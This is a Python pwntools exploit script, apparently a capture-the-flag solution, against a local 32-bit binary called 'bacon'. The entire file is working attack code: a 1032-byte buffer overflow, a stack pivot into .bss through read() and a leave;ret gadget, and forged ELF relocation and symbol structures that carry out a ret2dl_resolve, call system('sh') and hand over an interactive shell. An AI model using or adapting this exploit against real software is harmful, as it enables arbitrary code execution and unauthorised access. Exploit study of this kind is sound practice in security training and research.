from pwn import * 


p=process("./bacon")
binary = ELF("bacon")

new_memory = 0x804cf10 #.bss
leave_ret = 0x8049126  #: leave; ret;

'''
disassemble read
Dump of assembler code for function read@plt:
   0x08049040 <+0>:     jmp    DWORD PTR ds:0x804c00c
   0x08049046 <+6>:     push   0x0
   0x0804904b <+11>:    jmp    0x8049030
End of assembler dump
'''
resolver = 0x8049030


STRTAB = 0x80482ec
SYMTAB = 0x804820c
JMPREL = 0x8048408

### Stack pivoting read(0,new_memory,0x80)
payload = ''
payload += 'a'*1032
payload += p32(new_memory) #4 bytes para EIP
payload += p32(binary.plt['read']) #read()
payload += p32(leave_ret) #return address
payload += p32(0) #read(0,
payload += p32(new_memory) #read(0,new_memory,
payload += p32(0x80) #read(0,new_memory,0x80)

#compute offsets and forged structures
forged_ara = new_memory + 0x14
rel_offset = forged_ara - JMPREL
elf32_sym = forged_ara + 0x8

align = 0x10 - ((elf32_sym -SYMTAB) % 0x10) 

elf32_sym = elf32_sym + align
index_sym = (elf32_sym - SYMTAB) / 0x10

r_info = (index_sym << 8) | 0x7

elf32_rel = p32(binary.got['read']) + p32(r_info)
st_name = (elf32_sym + 0x10) - STRTAB
elf32_sym_struct = p32(st_name) + p32(0) + p32(0) + p32(0x12)



payload2 = 'AAAA' #fake ebp
payload2 += p32(resolver) #ret2 dl_resolve
payload2 += p32(rel_offset) # JMPRL + offset = struct
payload2 += 'AAAA' #fake return
payload2 += p32(new_memory+100)
payload2 += elf32_rel
payload2 += 'A' * align
payload2 += elf32_sym_struct 
payload2 += "system\x00"
x = (100-len(payload2))
payload2 += 'A' * x
payload2 += "sh\x00"
x = (0x80 - len(payload2))
payload2 += 'A' * x
 
p.sendline(payload)
pause(2)
p.sendline(payload2)
p.interactive()
